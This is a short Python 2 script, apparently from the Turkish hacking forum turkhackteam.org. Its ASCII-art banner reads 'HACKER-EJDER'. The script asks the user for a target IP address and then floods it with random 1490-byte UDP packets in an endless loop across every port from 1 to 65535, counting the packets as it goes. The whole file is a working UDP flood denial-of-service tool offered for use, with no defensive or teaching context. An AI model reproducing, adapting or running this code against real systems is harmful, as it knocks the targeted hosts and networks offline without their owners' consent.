#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import time
import socket
import random
os.system("cls")
os.system("color a")
print("~#~; Program turkhackteam.org ve hacking sevenler ailesi icin hazirlanmistir.")
time.sleep(5)
os.system("color c")
os.system("cls")
print("""
                        dp
                        
 	    dbPYB       dp   dp"dp     dpPYb   dpdpdp
 	    dp          dp   dp   dp   dp      dp   dp
 	    dPYd        dp   dp    dp  dpPYb   dpdpdp
 	    dp          dp   dp    dp  dp      dp  dp
            dbdpd   pdpdp    YbodPdp   YbodP   sp   dp. (HACKER-EJDER)
   -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-                                            
                       $EJDER_HACKER                                            
	""")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
bytes = random._urandom(1490)
ip = raw_input("<< Saldirilacak sistemin ip adresini giriniz >> ~# ")
os.system("cls")
sent = 0
port = 1
while True:
	try:
		if port == 65535:
			port = 1
		sock.sendto(bytes,(ip,port))
		sent = sent + 1
		port = port + 1
		os.system("color a")
		print("%s Paketler hedefe gonderiliyor."%sent)
			
	except KeyboardInterrupt:
		os.system("exit")
